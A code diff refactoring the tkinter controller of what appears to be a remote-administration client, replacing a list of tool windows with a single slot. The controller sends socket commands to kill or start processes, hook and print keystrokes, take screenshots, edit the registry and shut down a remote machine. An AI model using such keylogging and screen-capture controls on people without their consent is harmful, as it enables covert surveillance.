@@ -26,7 +26,7 @@ class Controller():
         self._menu.bind("<Destroy>", lambda e: self.exit_prog(
             event=e, isKilled=True))
         self._inputbox = [None] * 4
-        self._functions = [None] * 6
+        self._function = None
 
     def run(self):
         self._menu.mainloop()
@@ -41,21 +41,21 @@ class Controller():
 
     # Function 1
     def manager_prc(self, event):
-        if not self._functions[0] == None:
+        if not self._function == None:
             return
         if not self._socket._isconnected:
             utl.messagebox("Process", "Not connected to server", "warn")
             return
         self._socket.send("process")
-        self._functions[0] = mng.Manager(tk.Toplevel(self._root))
+        self._function = mng.Manager(tk.Toplevel(self._root))
         # bindings...
-        self._functions[0].btn_kill.bind("<Button>", self.manager_prc_kill)
-        self._functions[0].btn_view.bind("<Button>", self.manager_prc_view)
-        self._functions[0].btn_start.bind("<Button>", self.manager_prc_start)
-        self._functions[0].bind(
-            "<Destroy>", lambda e: self.exit_func(event=e, funcid=0))
+        self._function.btn_kill.bind("<Button>", self.manager_prc_kill)
+        self._function.btn_view.bind("<Button>", self.manager_prc_view)
+        self._function.btn_start.bind("<Button>", self.manager_prc_start)
+        self._function.bind(
+            "<Destroy>", self.exit_func)
         # run window
-        self._functions[0].mainloop()
+        self._function.mainloop()
 
     def manager_prc_kill(self, event):
         if not self._inputbox[0] == None:
@@ -85,26 +85,26 @@ class Controller():
         self._socket.send("process,view")
         list_len = int(self._socket._sock.recv(32).decode('utf8'))
         data = self._socket.receive(length=list_len).decode("utf8")
-        self._functions[0].view(data)
+        self._function.view(data)
 
     # Function 2
     def manager_app(self, event):
-        if not self._functions[1] == None:
+        if not self._function == None:
             return
         if not self._socket._isconnected:
             utl.messagebox("Application", "Not connected to server", "warn")
             return
         self._socket.send("application")
-        self._functions[1] = mng.Manager(
+        self._function = mng.Manager(
             tk.Toplevel(self._root), "application")
         # bindings...
-        self._functions[1].btn_kill.bind("<Button>", self.manager_app_kill)
-        self._functions[1].btn_view.bind("<Button>", self.manager_app_view)
-        self._functions[1].btn_start.bind("<Button>", self.manager_app_start)
-        self._functions[1].bind(
-            "<Destroy>", lambda e: self.exit_func(event=e, funcid=1))
+        self._function.btn_kill.bind("<Button>", self.manager_app_kill)
+        self._function.btn_view.bind("<Button>", self.manager_app_view)
+        self._function.btn_start.bind("<Button>", self.manager_app_start)
+        self._function.bind(
+            "<Destroy>", self.exit_func)
         # run window
-        self._functions[1].mainloop()
+        self._function.mainloop()
 
     def manager_app_kill(self, event):
         if not self._inputbox[2] == None:
@@ -134,7 +134,7 @@ class Controller():
         self._socket.send("application,view")
         list_len = int(self._socket._sock.recv(32).decode("utf8"))
         data = self._socket.receive(length=list_len).decode("utf8")
-        self._functions[1].view(data)
+        self._function.view(data)
 
     def manip_runnin(self, event, boxid, cmd, act):
         target = self._inputbox[boxid].getvalue()
@@ -153,22 +153,22 @@ class Controller():
 
     # Function 3
     def keystroke(self, event):
-        if not self._functions[2] == None:
+        if not self._function == None:
             return
         if not self._socket._isconnected:
             utl.messagebox("Keystroke", "Not connected to server", "warn")
             return
         self._socket.send("keystroke")
-        self._functions[2] = ksk.Keystroke(tk.Toplevel(self._root))
+        self._function = ksk.Keystroke(tk.Toplevel(self._root))
         # bindings...
-        self._functions[2].btn_hook.bind("<Button>", self.keystroke_hook)
-        self._functions[2].btn_unhook.bind("<Button>", self.keystroke_unhook)
-        self._functions[2].btn_print.bind("<Button>", self.keystroke_print)
-        self._functions[2].bind(
-            "<Destroy>", lambda e: self.exit_func(event=e, funcid=2))
-        # self._functions[2].btn_clear.bind("<Button>", self.keystroke_clear)
+        self._function.btn_hook.bind("<Button>", self.keystroke_hook)
+        self._function.btn_unhook.bind("<Button>", self.keystroke_unhook)
+        self._function.btn_print.bind("<Button>", self.keystroke_print)
+        self._function.bind(
+            "<Destroy>", self.exit_func)
+        # self._function.btn_clear.bind("<Button>", self.keystroke_clear)
         # run window
-        self._functions[2].mainloop()
+        self._function.mainloop()
 
     def keystroke_hook(self, event):
         self._socket.send(','.join(["keystroke", "hook"]))
@@ -180,65 +180,65 @@ class Controller():
         self._socket.send("keystroke,print")
         log_len = int(self._socket._sock.recv(32).decode('utf8'))
         data = self._socket.receive(length=log_len).decode("utf8")
-        self._functions[2].print_keystroke(data.decode("utf8"))
+        self._function.print_keystroke(data.decode("utf8"))
 
     # Function 4
     def screenshot(self, event):
-        if not self._functions[3] == None:
+        if not self._function == None:
             return
         if not self._socket._isconnected:
             utl.messagebox("Screenshot", "Not connected to server", "warn")
             return
         self._socket.send("screenshot")
-        self._functions[3] = ssh.Screenshot(tk.Toplevel(self._root))
+        self._function = ssh.Screenshot(tk.Toplevel(self._root))
         # bindings...
-        self._functions[3].btn_snap.bind("<Button>", self.screenshot_snap)
-        self._functions[3].btn_save.bind("<Button>", self.screenshot_save)
-        self._functions[3].bind(
-            "<Destroy>", lambda e: self.exit_func(event=e, funcid=3))
-        self._functions[3].mainloop()
+        self._function.btn_snap.bind("<Button>", self.screenshot_snap)
+        self._function.btn_save.bind("<Button>", self.screenshot_save)
+        self._function.bind(
+            "<Destroy>", self.exit_func)
+        self._function.mainloop()
 
     def screenshot_snap(self, event):
         # send
         self._socket.send("screenshot,snap")
         picture_len = int(self._socket._sock.recv(32).decode('utf8'))
         data = self._socket.receive(length=picture_len)
-        self._functions[3].update_image(data)
+        self._function.update_image(data)
 
     def screenshot_save(self, event):
-        self._functions[3].save_image()
+        self._function.save_image()
 
     # Function 5
     def registry(self, event):
-        if not self._functions[4] == None:
+        if not self._function == None:
             return
         if not self._socket._isconnected:
             utl.messagebox("Registry", "Not connected to server", "warn")
             return
         self._socket.send("registry")
-        self._functions[4] = rgs.Registry(tk.Toplevel(self._root))
+        self._function = rgs.Registry(tk.Toplevel(self._root))
         # bindings...
-        self._functions[4].btn_browse.bind("<Button>", self.registry_browse)
-        self._functions[4].btn_sendcont.bind(
+        self._function.btn_browse.bind("<Button>", self.registry_browse)
+        self._function.btn_sendcont.bind(
             "<Button>", self.registry_sendcont)
-        self._functions[4].btn_send.bind("<Button>", self.registry_send)
-        self._functions[4].bind(
-            "<Destroy>", lambda e: self.exit_func(event=e, funcid=4))
-        self._functions[4].mainloop()
+        self._function.btn_send.bind("<Button>", self.registry_send)
+        self._function.bind(
+            "<Destroy>", self.exit_func)
+        self._function.mainloop()
 
     def registry_browse(self, event):
-        self._functions[4].browse_path()
+        self._function.browse_path()
 
     def registry_sendcont(self, event):
         self._socket.send(
-            ','.join(["registry", "set", self._functions[4]._regcont]))
+            ','.join(["registry", "set", self._function._regcont]))
 
     def registry_send(self, event):
-        func = self._functions[4]._df_func.get().strip("\n")
-        path = self._functions[4].txt_path.get("1.0", tk.END).strip("\n")
-        name = self._functions[4].txt_name.get("1.0", tk.END).strip("\n")
-        value = self._functions[4].txt_value.get("1.0", tk.END).strip("\n")
-        dttp = self._functions[4]._df_dttype.get().strip("\n")
+        func = self._function._df_func.get().strip("\n")
+        path = self._function.txt_path.get("1.0", tk.END).strip("\n")
+        name = self._function.txt_name.get("1.0", tk.END).strip("\n")
+        value = self._function.txt_value.get("1.0", tk.END).strip("\n")
+        dttp = self._function._df_dttype.get().strip("\n")
 
         request = None
         if func == "Get value":
@@ -257,15 +257,17 @@ class Controller():
 
     # Function 6
     def shutdown(self, event):
+        if not self._function == None:
+            return
         if not self._socket._isconnected:
             utl.messagebox("Process", "Not connected to server", "warn")
             return
         self._socket.send("shutdown")
         self._socket.shutdown()
 
-    def exit_func(self, event, funcid):
+    def exit_func(self, event):
         self._socket.send("exit")
-        self._functions[funcid] = None
+        self._function = None
 
     # Exit program
     def exit_prog(self, event, isKilled=False):
